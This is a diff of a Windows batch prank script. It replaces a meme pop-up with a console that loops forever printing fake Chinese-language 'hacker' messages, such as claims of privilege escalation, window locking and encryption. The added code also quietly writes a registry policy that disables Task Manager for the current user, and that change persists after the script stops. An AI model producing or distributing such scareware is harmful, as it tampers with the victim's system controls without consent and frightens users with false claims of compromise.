@@ -1,3 +1,15 @@
 @echo off
-set "text=ikun"
-mshta vbscript:Execute("CreateObject(""WScript.Shell""):res=1920:res2=1080:Set w=window.open("""",""ikun"",""width=""&res&"",height=""&res2&"",close=no""):w.document.write(""<center><h1 style='font-size:60px;margin-top:200px;'>%text%</h1></center>"")")(window.close)
+chcp 65001 >nul
+title 爱坤
+color 0a
+mode con cols=240 lines=60
+reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>nul
+:loop
+echo [INFO] 正在加载核心模块 %random%%random%%random%%random%
+echo [DEBUG] 分辨率检测完成：1920x1080
+echo [EXPERT] 第 %random%%random%%random%%random% 行代码执行中
+echo [SYSTEM] 窗口锁定成功 —— 爱坤专属界面
+echo [LOAD] 数据加密校验 %random%%random%%random%%random%
+echo [OK] 系统权限提升完成
+echo.
+goto loop
